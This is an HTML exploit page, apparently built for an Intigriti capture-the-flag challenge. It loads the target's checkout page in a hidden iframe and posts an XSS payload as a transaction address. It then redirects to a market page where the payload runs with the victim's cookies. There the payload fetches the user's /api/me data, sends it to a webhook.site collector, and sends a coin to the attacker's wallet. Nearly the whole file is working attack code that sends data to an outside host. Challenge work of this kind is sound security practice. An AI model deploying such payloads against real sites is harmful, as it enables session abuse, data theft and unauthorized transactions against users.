<!DOCTYPE html>
<html>
<head><title>FINAL</title></head>
<body>
<div id="log"></div>
<script>
const T = 'https://challenge-0126.intigriti.io';
const W = 'https://webhook.site/4ef6fff2-d35d-411e-baae-13ba21343475';
const WALLET = '16472226db03703a192aa383237035a69f';
let s = 0;

function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?'+s+'='+encodeURIComponent(m); }

async function exploit() {
    log('STARTING FINAL EXPLOIT');

    // XSS payload that will execute on challenge domain with admin cookies
    // Steps: 1) Get flag, 2) Send coin, 3) Report success
    const xssPayload = `&lt;img src=x onerror=&quot;
        // Step 1: Steal flag from /api/me
        fetch('${T}/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>{
            fetch('${W}/?FLAG='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'});
            // Step 2: Send 1 1337COIN to our wallet
            fetch('${T}/api/transaction',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                credentials:'include',
                body:JSON.stringify({
                    toAddress:'${WALLET}',
                    currency:'1337COIN',
                    amount:1
                })
            }).then(()=>fetch('${W}/?COIN_SENT=1',{mode:'no-cors'}));
        });
    &quot;&gt;`;

    log('Loading checkout iframe...');
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
    document.body.appendChild(iframe);

    await new Promise(r => { iframe.onload = r; setTimeout(r, 3000); });
    log('Iframe loaded');

    // Send transaction with XSS payload as address
    log('Sending postMessage with XSS payload...');
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: xssPayload,
            currency: '1337COIN',
            amount: 0
        }
    }, '*');
    log('postMessage sent');

    // Wait and redirect to marketwatch where XSS triggers
    await new Promise(r => setTimeout(r, 3000));
    log('Redirecting to marketwatch (XSS will trigger)...');
    window.location.href = T + '/marketwatch.html';
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
